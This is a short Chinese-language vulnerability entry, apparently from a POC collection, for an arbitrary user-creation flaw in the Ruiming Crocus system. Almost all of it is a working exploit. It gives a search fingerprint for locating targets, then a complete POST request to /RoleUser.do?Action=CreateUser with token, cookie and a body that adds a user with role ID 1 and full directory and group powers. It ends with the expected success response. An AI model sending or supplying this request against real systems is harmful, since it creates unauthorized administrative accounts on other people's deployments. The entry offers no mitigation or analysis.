# 锐明Crocus系统存在任意用户添加漏洞

- **系统**：锐明Crocus系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="inp_verification"`
- **请求**：`POST /RoleUser.do?Action=CreateUser HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Token: d2Vic2VjOjE3MjQwNjk4NzE5NDk=`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Cookie: JSESSIONID=5420BDDEB39984240BE700F2E755F2F9; Saffron.U=VUlEPTImVU49d2Vic2VjJkdJR…`　`Content-Length: 243`

**请求体 / payload**
```
UserID=&RoleID=1&DirName=%E6%A0%B9%E7%9B%AE%E5%BD%95&DirPower=1&GroupPower=1&GroupPowerName=crocus-center(81)&UserName=d2Jz&Password=ed5b11f0310676df5b25b140d8aab20e&ConfirmPassword=ed5b11f0310676df5b25b140d8aab20e&TelPhone=&Email=admin123%40qq.com
```
- **预期**：200　|　{"Code":202,"Result":true}